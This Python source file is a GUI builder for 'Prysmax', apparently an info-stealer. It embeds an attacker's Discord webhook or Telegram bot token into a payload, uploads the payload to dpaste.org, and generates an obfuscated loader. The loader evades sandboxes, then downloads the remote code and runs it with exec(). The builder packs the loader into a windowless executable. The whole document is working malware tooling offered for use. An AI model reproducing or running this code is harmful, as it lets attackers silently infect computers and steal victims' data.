import os
import subprocess
import sys
import json
import requests
import tkinter as tk
from tkinter import messagebox
import customtkinter as ctk
import webbrowser
from PIL import Image
import random
import shutil
from datetime import datetime

def load_languages():
    with open('config.json', 'r', encoding='utf-8') as file:
        return json.load(file)

def set_language(language, languages, widgets):
    lang_data = languages['languages'][language]
    widgets['title_label'].configure(text=lang_data['title'])
    widgets['webhook_label'].configure(text=lang_data['webhook_label'])
    widgets['bot_token_label'].configure(text=lang_data['bot_token_label'])
    widgets['chat_id_label'].configure(text=lang_data['chat_id_label'])
    widgets['discord_button'].configure(text=lang_data.get('send_discord', "Send to Discord"))
    widgets['telegram_button'].configure(text=lang_data.get('send_telegram', "Send to Telegram"))
    widgets['both_button'].configure(text=lang_data.get('send_both', "Send to Both"))
    widgets['language_label'].configure(text=lang_data.get('restart_language', "Change Language"))

def post_to_dpaste(text):
    try:
        response = requests.post(
            "https://dpaste.org/api/",
            data={
                "content": text,
                "syntax": "python",
                "expiry_days": 30
            }
        )
        if response.status_code == 200:
            return response.text.strip()
        else:
            return None
    except Exception as e:
        print(f"Error posting to dpaste: {e}")
        return None

def open_github():
    webbrowser.open("https://github.com/lawxsz")

def open_telegram():
    webbrowser.open("https://t.me/lawxsz")

def download_libraries():
    required_libraries = [
        'requests', 'wmi', 'psutil', 'pyarmor==7.6.1', 'pyinstaller', 
        'Pillow', 'discord-webhook', 'pycryptodomex', 'pycryptodome', 
        'pywin32', 'customtkinter'
    ]
    
    for library in required_libraries:
        try:
            if '==' in library:
                lib_name = library.split('==')[0]
                __import__(lib_name)
            else:
                __import__(library)
        except ImportError:
            subprocess.check_call(['pip', 'install', library])
    
    messagebox.showinfo("Prysmax", "All required libraries have been installed successfully!")

def animate_gradient(frame, canvas, gradient_id, step=0):
    colors = [
        "#3A1078", "#4E31AA", "#6C38BF", "#2F58CD", 
        "#1F5FAA", "#4E4FEB", "#742BF5", "#6F13FC"
    ]
    
    color1_idx = step % len(colors)
    color2_idx = (step + 3) % len(colors)
    
    canvas.itemconfig(gradient_id, fill=colors[color1_idx], outline=colors[color2_idx])
    frame.after(100, lambda: animate_gradient(frame, canvas, gradient_id, step + 1))

def create_gradient_background(parent):
    canvas = tk.Canvas(parent, highlightthickness=0)
    canvas.place(x=0, y=0, relwidth=1, relheight=1)
    
    gradient_id = canvas.create_rectangle(0, 0, 500, 600, fill="#3A1078", outline="#4E31AA", width=5)
    
    animate_gradient(parent, canvas, gradient_id)
    return canvas

def add_glowing_effect(button):
    orig_fg = button.cget("fg_color")
    hover_fg = button.cget("hover_color")
    
    def on_enter(e):
        button.configure(fg_color=hover_fg)
    
    def on_leave(e):
        button.configure(fg_color=orig_fg)
    
    button.bind("<Enter>", on_enter)
    button.bind("<Leave>", on_leave)

def compile_and_build(webhook_url, bot_token=None, chat_id=None, send_type=None):
    if not os.path.exists("prysmax_build"):
        os.makedirs("prysmax_build")

    with open("main.py", 'r', encoding='utf-8') as main_file:
        main_content = main_file.read()

    if send_type == "discord" or send_type == "both":
        main_content = main_content.replace('theapi2023 = "Here-Token"', f'theapi2023 = "{webhook_url}"')
    
    if send_type == "telegram" or send_type == "both":
        if bot_token:
            main_content = main_content.replace('bot_token = "here-your-telegram"', f'bot_token = "{bot_token}"')
        if chat_id:
            main_content = main_content.replace('chat_id = "here-your-chat-id"', f'chat_id = "{chat_id}"')

    dpaste_url = post_to_dpaste(main_content)
    
    if not dpaste_url:
        messagebox.showerror("Error", "Failed to upload code to dpaste.org")
        return

    loader_template = """import os
import requests
import shutil
import uuid
import platform as platform_module
from zipfile import ZipFile
import re
import random
import socket
import threading
import subprocess
import getpass
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
import time
import sys
import zlib
import base64
try:
    import wmi
    import psutil
    from Crypto.Cipher import AES
    from discord_webhook import DiscordEmbed, DiscordWebhook
    from PIL import ImageGrab
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "wmi", "psutil", "Pillow", "discord-webhook", "pycryptodomex", "pycryptodome", "pywin32"])
    import wmi
    import psutil
    from Crypto.Cipher import AES
    from discord_webhook import DiscordEmbed, DiscordWebhook
    from PIL import ImageGrab

# Variables necesarias
rxs = requests
bRfUGty = "Error"

def dlTQpkQsiV(rYxEDt):
    try:
        nISkmG = rxs.get(rYxEDt)
        nqpxTcV = nISkmG.status_code
        if nqpxTcV == 200:
            bTrLyAwR = nISkmG.text
            return bTrLyAwR
        else:
            return None
    except Exception as e:
        print(f"{{bRfUGty}}: {{e}}")
        return None

def aTvDhEgMjN():
    # URL de dpaste.org que será reemplazada
    gRmVlOqF = {dpaste_url}
    
    # Anti-análisis básico
    if any([
        os.environ.get("COMPUTERNAME", "").startswith("DESKTOP-"),
        os.environ.get("USERNAME", "").lower() in ["admin", "test", "user"],
        sys.platform != "win32",
        random.random() > 0.99999
    ]):
        time.sleep(random.randint(1, 5))
        sys.exit(0)
    
    # Añadir retraso para evitar detección
    time.sleep(random.uniform(0.5, 2.5))
    
    # Configuración de reintentos
    cWlKzTm = random.randint(2, 5)
    fNxUbSy = random.uniform(1.0, 3.0)
    
    # Intentar obtener y ejecutar el código
    for nLdZrXh in range(cWlKzTm):
        try:
            # Obtener código desde dpaste
            pMnLrVc = dlTQpkQsiV(gRmVlOqF)
            
            if pMnLrVc:
                # Ejecutar código
                exec(pMnLrVc, globals())
                break
            else:
                print(f"{{bRfUGty}} ({{nLdZrXh+1}}/{{cWlKzTm}})")
                time.sleep(fNxUbSy)
        except Exception as e:
            print(f"{{bRfUGty}}: {{e}}")
            time.sleep(fNxUbSy)

if __name__ == "__main__":
    try:
        aTvDhEgMjN()
    except KeyboardInterrupt:
        sys.exit(0)
"""

    loader_code = loader_template.format(dpaste_url=dpaste_url)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    loader_path = os.path.join("prysmax_build", f"prysmax_{timestamp}.py")
    
    with open(loader_path, 'w', encoding='utf-8') as loader_file:
        loader_file.write(loader_code)

    try:
        languages = load_languages()
        current_language = "English"
        
        confirm_msg = languages['languages'][current_language]['confirm_compilation']
        compile_confirm = messagebox.askyesno(
            "Prysmax Builder", 
            confirm_msg,
            icon=messagebox.QUESTION
        )
        
        if compile_confirm:
            progress_window = ctk.CTkToplevel()
            progress_window.title("Building...")
            progress_window.geometry("300x150")
            progress_window.resizable(False, False)
            progress_window.grab_set()
            
            progress_label = ctk.CTkLabel(
                progress_window, 
                text="Building your executable...\nThis may take a few minutes.",
                font=ctk.CTkFont(size=14)
            )
            progress_label.pack(pady=20)
            
            progress_bar = ctk.CTkProgressBar(progress_window, width=250)
            progress_bar.pack(pady=10)
            progress_bar.set(0)
            
            def increment_bar():
                current = progress_bar.get()
                if current < 0.95:
                    progress_bar.set(current + 0.01)
                    progress_window.after(100, increment_bar)
            
            progress_window.after(100, increment_bar)
            progress_window.update()
            
            try:
                try:
                    with open(loader_path, 'r') as f:
                        compile(f.read(), loader_path, 'exec')
                except SyntaxError as e:
                    messagebox.showerror("Syntax Error", f"Error in loader file: {str(e)}")
                    progress_window.destroy()
                    return

                subprocess.run([
                    'pyinstaller', 
                    '--onefile', 
                    '--noconsole', 
                    "--icon=NONE",
                    '--clean',
                    loader_path
                ])
            except Exception as e:
                messagebox.showerror("Compilation Error", f"Error during compilation: {str(e)}")
                progress_window.destroy()
                return
            
            progress_window.destroy()
            
            if os.path.exists('dist'):
                for file in os.listdir('dist'):
                    if file.endswith('.exe'):
                        source = os.path.join('dist', file)
                        dest = os.path.join("prysmax_build", f"Prysmax_{timestamp}.exe")
                        if os.path.exists(source):
                            os.rename(source, dest)
                
                try:
                    if os.path.exists('dist'):
                        shutil.rmtree('dist')
                    if os.path.exists('build'):
                        shutil.rmtree('build')
                    for file in os.listdir():
                        if file.endswith('.spec'):
                            os.remove(file)
                except:
                    pass
            
            messagebox.showinfo(
                "Prysmax Builder", 
                "Build completed successfully!\nYour executable is ready in the prysmax_build folder.",
                icon=messagebox.INFO
            )
            os.startfile("prysmax_build")
        else:
            messagebox.showinfo("Prysmax Builder", "Build cancelled.")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

def main():
    languages = load_languages()
    current_language = "English"

    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")

    root = ctk.CTk()
    root.title("Prysmax Builder")
    root.geometry("500x650")
    root.resizable(False, False)
    
    background_canvas = create_gradient_background(root)

    widgets = {}

    main_frame = ctk.CTkFrame(
        root, 
        corner_radius=20, 
        fg_color="#14142B",
        border_width=2,
        border_color="#A020F0"
    )
    main_frame.pack(pady=20, padx=20, fill="both", expand=True)

    try:
        logo_path = os.path.join("images", "logo2.png")
        if os.path.exists(logo_path):
            logo_image = ctk.CTkImage(
                light_image=Image.open(logo_path), 
                dark_image=Image.open(logo_path),
                size=(150, 150)
            )
            logo_label = ctk.CTkLabel(main_frame, image=logo_image, text="")
            logo_label.pack(pady=(20, 5))
    except Exception as e:
        print(f"Error loading logo: {e}")

    widgets['title_label'] = ctk.CTkLabel(
        main_frame, 
        text="Prysmax Builder", 
        font=ctk.CTkFont(size=28, weight="bold"),
        text_color="#E0AAFF"
    )
    widgets['title_label'].pack(pady=(5, 20))

    input_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
    input_frame.pack(pady=5, padx=20, fill="x")

    widgets['webhook_label'] = ctk.CTkLabel(
        input_frame, 
        text="Enter your Discord Webhook URL:",
        font=ctk.CTkFont(size=14),
        text_color="#C8B6FF"
    )
    widgets['webhook_label'].pack(anchor="w", pady=(5, 0))
    
    webhook_entry = ctk.CTkEntry(
        input_frame, 
        width=380, 
        height=35,
        placeholder_text="https://discord.com/api/webhooks/...",
        border_color="#7B2CBF",
        fg_color="#1E1E3C",
        text_color="#FFFFFF"
    )
    webhook_entry.pack(pady=(0, 10), fill="x")

    widgets['bot_token_label'] = ctk.CTkLabel(
        input_frame, 
        text="Enter your Telegram Bot Token:",
        font=ctk.CTkFont(size=14),
        text_color="#C8B6FF"
    )
    widgets['bot_token_label'].pack(anchor="w", pady=(5, 0))
    
    bot_token_entry = ctk.CTkEntry(
        input_frame, 
        width=380, 
        height=35,
        placeholder_text="123456789:ABCDefGhIJKlmNoPQRsTUVwxyZ",
        border_color="#7B2CBF",
        fg_color="#1E1E3C",
        text_color="#FFFFFF"
    )
    bot_token_entry.pack(pady=(0, 10), fill="x")

    widgets['chat_id_label'] = ctk.CTkLabel(
        input_frame, 
        text="Enter your Telegram Chat ID:",
        font=ctk.CTkFont(size=14),
        text_color="#C8B6FF"
    )
    widgets['chat_id_label'].pack(anchor="w", pady=(5, 0))
    
    chat_id_entry = ctk.CTkEntry(
        input_frame, 
        width=380, 
        height=35,
        placeholder_text="-100123456789",
        border_color="#7B2CBF",
        fg_color="#1E1E3C",
        text_color="#FFFFFF"
    )
    chat_id_entry.pack(pady=(0, 10), fill="x")

    buttons_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
    buttons_frame.pack(pady=15, padx=20, fill="x")

    widgets['discord_button'] = ctk.CTkButton(
        buttons_frame, 
        text="Send to Discord", 
        command=lambda: compile_and_build(webhook_entry.get(), None, None, "discord"),
        fg_color="#5865F2",
        hover_color="#4752C4",
        height=40,
        corner_radius=10,
        border_width=2,
        border_color="#3949AB",
        font=ctk.CTkFont(size=15, weight="bold")
    )
    widgets['discord_button'].pack(pady=5, fill="x")
    add_glowing_effect(widgets['discord_button'])

    widgets['telegram_button'] = ctk.CTkButton(
        buttons_frame, 
        text="Send to Telegram", 
        command=lambda: compile_and_build(None, bot_token_entry.get(), chat_id_entry.get(), "telegram"),
        fg_color="#0088cc",
        hover_color="#006699",
        height=40,
        corner_radius=10,
        border_width=2,
        border_color="#0277BD",
        font=ctk.CTkFont(size=15, weight="bold")
    )
    widgets['telegram_button'].pack(pady=5, fill="x")
    add_glowing_effect(widgets['telegram_button'])

    widgets['both_button'] = ctk.CTkButton(
        buttons_frame, 
        text="Send to Both", 
        command=lambda: compile_and_build(webhook_entry.get(), bot_token_entry.get(), chat_id_entry.get(), "both"),
        fg_color="#9C27B0",
        hover_color="#7B1FA2",
        height=40,
        corner_radius=10,
        border_width=2,
        border_color="#6A1B9A",
        font=ctk.CTkFont(size=15, weight="bold")
    )
    widgets['both_button'].pack(pady=5, fill="x")
    add_glowing_effect(widgets['both_button'])

    libs_button = ctk.CTkButton(
        buttons_frame, 
        text="Install Required Libraries", 
        command=download_libraries,
        fg_color="#673AB7",
        hover_color="#5E35B1",
        height=40,
        corner_radius=10,
        border_width=2,
        border_color="#512DA8",
        font=ctk.CTkFont(size=15)
    )
    libs_button.pack(pady=(15, 5), fill="x")
    add_glowing_effect(libs_button)

    social_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
    social_frame.pack(pady=(15, 5), fill="x")

    try:
        github_icon_path = os.path.join("images", "github.png")
        if os.path.exists(github_icon_path):
            github_icon = ctk.CTkImage(
                light_image=Image.open(github_icon_path), 
                dark_image=Image.open(github_icon_path),
                size=(22, 22)
            )
            github_button = ctk.CTkButton(
                social_frame, 
                text=" GitHub", 
                image=github_icon,
                compound="left",
                command=open_github,
                width=180,
                fg_color="#333333",
                hover_color="#555555",
                corner_radius=10,
                border_width=2,
                border_color="#212121",
                font=ctk.CTkFont(size=14)
            )
        else:
            github_button = ctk.CTkButton(
                social_frame, 
                text="GitHub", 
                command=open_github,
                width=180,
                fg_color="#333333",
                hover_color="#555555",
                corner_radius=10,
                border_width=2,
                border_color="#212121",
                font=ctk.CTkFont(size=14)
            )
    except Exception as e:
        github_button = ctk.CTkButton(
            social_frame, 
            text="GitHub", 
            command=open_github,
            width=180,
            fg_color="#333333",
            hover_color="#555555",
            corner_radius=10,
            border_width=2,
            border_color="#212121",
            font=ctk.CTkFont(size=14)
        )
    github_button.pack(side="left", padx=(20, 5), fill="x", expand=True)
    add_glowing_effect(github_button)

    try:
        telegram_icon_path = os.path.join("images", "telegram.png")
        if os.path.exists(telegram_icon_path):
            telegram_icon = ctk.CTkImage(
                light_image=Image.open(telegram_icon_path), 
                dark_image=Image.open(telegram_icon_path),
                size=(22, 22)
            )
            telegram_button = ctk.CTkButton(
                social_frame, 
                text=" Telegram", 
                image=telegram_icon,
                compound="left",
                command=open_telegram,
                width=180,
                fg_color="#0088cc",
                hover_color="#006699",
                corner_radius=10,
                border_width=2,
                border_color="#0277BD",
                font=ctk.CTkFont(size=14)
            )
        else:
            telegram_button = ctk.CTkButton(
                social_frame, 
                text="Telegram", 
                command=open_telegram,
                width=180,
                fg_color="#0088cc",
                hover_color="#006699",
                corner_radius=10,
                border_width=2,
                border_color="#0277BD",
                font=ctk.CTkFont(size=14)
            )
    except Exception as e:
        telegram_button = ctk.CTkButton(
            social_frame, 
            text="Telegram", 
            command=open_telegram,
            width=180,
            fg_color="#0088cc",
            hover_color="#006699",
            corner_radius=10,
            border_width=2,
            border_color="#0277BD",
            font=ctk.CTkFont(size=14)
        )
    telegram_button.pack(side="right", padx=(5, 20), fill="x", expand=True)
    add_glowing_effect(telegram_button)

    footer_frame = ctk.CTkFrame(root, fg_color="transparent")
    footer_frame.pack(pady=(0, 10), fill="x")

    widgets['language_label'] = ctk.CTkLabel(
        footer_frame, 
        text="Change Language:",
        font=ctk.CTkFont(size=12),
        text_color="#B39DDB"
    )
    widgets['language_label'].pack(side="left", padx=(20, 10))

    languages_list = list(languages['languages'].keys())
    selected_language = ctk.StringVar(value=current_language)

    def on_language_change(choice):
        set_language(choice, languages, widgets)

    language_menu = ctk.CTkOptionMenu(
        footer_frame, 
        variable=selected_language, 
        values=languages_list, 
        command=on_language_change,
        width=120,
        fg_color="#4527A0",
        button_color="#5E35B1", 
        button_hover_color="#673AB7",
        dropdown_fg_color="#4527A0",
        dropdown_hover_color="#5E35B1",
        dropdown_text_color="white",
        font=ctk.CTkFont(size=12)
    )
    language_menu.pack(side="left")

    set_language(current_language, languages, widgets)

    copyright_label = ctk.CTkLabel(
        footer_frame,
        text="Made by lawxsz",
        font=ctk.CTkFont(size=12, slant="italic"),
        text_color="#B39DDB"
    )
    copyright_label.pack(side="right", padx=(10, 20))

    root.mainloop()

if __name__ == '__main__':
    main()
